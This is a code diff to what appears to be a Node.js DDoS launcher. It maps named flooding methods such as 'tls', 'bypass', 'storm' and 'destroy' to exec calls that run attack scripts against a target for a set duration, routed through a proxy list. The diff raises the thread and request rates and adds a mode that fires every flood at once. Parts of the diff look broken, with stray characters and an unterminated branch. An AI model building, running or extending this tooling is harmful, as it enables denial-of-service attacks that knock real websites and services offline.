@@ -257,19 +257,19 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
 	sigma()
   } else if (methods === 'tls') {
     pushOngoing(target, methods, duration)
-     exec(`node ${metode} ${target} ${duration} 100 10`)
+     exec(`node ${metode} ${target} ${duration} 100 100`)
     sigma()
     } else if (methods === 'strike') {
       pushOngoing(target, methods, duration)
-       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
+       exec(`node ${metode} GET ${target} ${duration} 100 100 proxy.txt`)
       sigma()
       } else if (methods === 'kill') {
        pushOngoing(target, methods, duration)
-        exec(`node ${metode} ${target} ${duration} 100 10`)
+        exec(`node ${metode} ${target} ${duration} 100 20`)
         sigma()
         } else if (methods === 'bypass') {
        pushOngoing(target, methods, duration)
-        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+        exec(`node ${metode} ${target} ${duration} 100 100 proxy.txt`)
           sigma()
           } else if (methods === 'raw') {
        pushOngoing(target, methods, duration)
@@ -277,22 +277,23 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
           sigma()
           } else if (methods === 'thunder') {
        pushOngoing(target, methods, duration)
-        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+        exec(`node ${metode} ${target} ${duration} 100 100 proxy.txt`)
           sigma()
           } else if (methods === 'rape') {
        pushOngoing(target, methods, duration)
-        exec(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`)
+        exec(`node ${metode} ${duration} 100 proxy.txt 70 ${target}`)
           sigma()
           } else if (methods === 'storm') {
        pushOngoing(target, methods, duration)
-        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+        exec(`node ${metode} ${target} ${duration} 100 100 proxy.txt`)
           sigma()
           } else if (methods === 'destroy') {
        pushOngoing(target, methods, duration)/
-        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+        exec(`node ${metode} ${target} ${duration} 100 100 proxy.txt`)
           sigma()
-          } else if (methods === 'slim') {
+          } else if (methods === 'flooder') {
        pushOngoing(target, methods, duration)
+	exec(`node ${metode} ${target} ${duration} 100 100 proxy.txt`)
 const flood = path.join(__dirname, `/lib/cache/flood.js`);
 const tls = path.join(__dirname, `/lib/cache/tls.js`);
 const strike = path.join(__dirname, `/lib/cache/strike.js`);
@@ -302,16 +303,20 @@ const raw = path.join(__dirname, `/lib/cache/raw.js`);
 const thunder = path.join(__dirname, `/lib/cache/thunder.js`);
 const rape = path.join(__dirname, `/lib/cache/rape.js`);
 const storm = path.join(__dirname, `/lib/cache/storm.js`);
-        exec(`node ${flood} ${target} ${duration} 100 1 proxy.txt`)
-        exec(`node ${tls} ${target} ${duration} 100 1 proxy.txt`)
-        exec(`node ${strike} ${duration} 1 proxy.txt 70 ${target}`)
-	exec(`node ${kill} ${target} ${duration} 100 10`)
-	exec(`node ${bypass} ${target} ${duration} 100 10 proxy.txt`)
-	exec(`node ${flood} ${target} ${duration} 100 1 proxy.txt`)
-	  TARGET : ` + parsedTarget.host + `
-       DURATION : ` + args.time + `
-       THREADS : ` + args.threads + `
-       RPS : `
+const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
+const flooder = path.join(__dirname, `/lib/cache/flooder.js`);
+        exec(`node ${flood} ${target} ${duration}`)
+        exec(`node ${tls} ${target} ${duration} 100 100`)
+        exec(`node ${strike} GET ${target} ${duration} 100 100 proxy.txt`)
+	exec(`node ${kill} ${target} ${duration} 100 20`)
+	exec(`node ${bypass} ${target} ${duration} 100 100 proxy.txt`)
+	exec(`node ${raw} ${target} ${duration}`)
+	exec(`node ${thunder} ${target} ${duration} 100 100 proxy.txt`)
+        exec(`node ${rape} ${duration} 100 proxy.txt 70 ${target}`)
+	exec(`node ${storm} ${target} ${duration} 100 100 proxy.txt`)
+	exec(`node ${destroy} ${target} ${duration} 100 100 proxy.txt`)
+	exec(`node ${flooder} ${target} ${duration} 100 100 proxy.txt`)
+	  
           sigma()
           } else {
     console.log(`Method ${methods} not recognized.`);
